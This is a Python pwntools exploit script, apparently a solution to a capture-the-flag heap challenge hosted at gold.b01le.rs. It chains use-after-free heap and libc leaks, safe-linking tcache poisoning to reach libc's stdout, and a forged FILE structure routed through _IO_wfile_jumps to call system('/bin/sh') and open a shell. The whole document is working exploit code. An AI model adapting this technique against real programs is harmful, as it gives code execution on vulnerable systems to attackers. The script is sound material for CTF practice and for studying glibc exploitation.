#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./chal_patched", checksec=False)
libc = elf.libc


def start(argv=[], *a, **kw):
    nc = "nc gold.b01le.rs 4002"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


def alloc(idx, size):
    io.sendlineafter(b"Resize----\n", b"1")
    io.sendlineafter(b"Where? ", str(idx).encode())
    io.sendlineafter(b"size? ", str(size).encode())


def free(idx):
    io.sendlineafter(b"Resize----\n", b"2")
    io.sendlineafter(b"Where? ", str(idx).encode())


def view(idx):
    io.sendlineafter(b"Resize----\n", b"3")
    io.sendlineafter(b"Where? ", str(idx).encode())
    resp = u64(io.recvline().strip().ljust(8, b"\x00"))
    return resp


def edit(idx, data):
    io.sendlineafter(b"Resize----\n", b"4")
    io.sendlineafter(b"Where? ", str(idx).encode())
    io.send(data)


def resize(idx, size):
    io.sendlineafter(b"Resize----\n", b"6")
    io.sendlineafter(b"Where? ", str(idx).encode())
    io.sendlineafter(b"size? ", str(size).encode())


def pie_leak():
    io.sendlineafter(b"Resize----\n", b"7")
    io.recvuntil(b"Address: ")
    resp = int(io.recvline(), 16)
    return resp


env = {}
io = start()

alloc(0, 0x200)
alloc(1, 0x200)
alloc(2, 0x500)
alloc(3, 0x20)  # pad
free(1)
free(0)
heap_base = view(1) << 12
log.info(f"{heap_base=:#x}")

free(2)
libc_leak = view(2)
libc.address = libc_leak - (libc.sym["main_arena"] + 96)
log.info(f"{libc.address=:#x}")

# elf.address = pie_leak() - 0x159f
# log.info(f"{elf.address=:#x}")

gadget = libc.address + 0x00142627  # add rdi, 0x10; jmp rcx;
libc_stdout = libc.sym["_IO_2_1_stdout_"]

payload = p64((heap_base >> 12) ^ (libc_stdout - 0x30))
edit(0, payload)
alloc(4, 0x200)
alloc(5, 0x200)
# trick malloc_usable_size when checking prev_inuse bit with negative
# chunk size
payload = flat(0, 0x1, 0, -0x10)
edit(5, payload)

alloc(0, 0x100)
alloc(1, 0x100)
alloc(2, 0x20)
free(1)
free(0)

payload = p64((heap_base >> 12) ^ (libc_stdout - 0x10))
edit(0, payload)

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
# the function that we will call: system()
fake._IO_read_end = libc.sym['system']
fake._IO_save_base = gadget
fake._IO_write_end = u64(b'/bin/sh\x00')  # will be at rdi+0x10
fake._lock = libc.sym["_IO_stdfile_1_lock"]
fake._codecvt = libc_stdout + 0xb8
# _wide_data just need to points to empty zone
fake._wide_data = libc_stdout + 0x200
fake.unknown2 = (p64(0) * 2 + p64(libc_stdout + 0x20) +
                 p64(0) * 3 + p64(libc.sym['_IO_wfile_jumps'] - 0x18))

alloc(4, 0x100)
alloc(5, 0x100)
payload = flat(0, libc.sym["_IO_file_jumps"]) + bytes(fake)
edit(5, payload)

io.interactive()
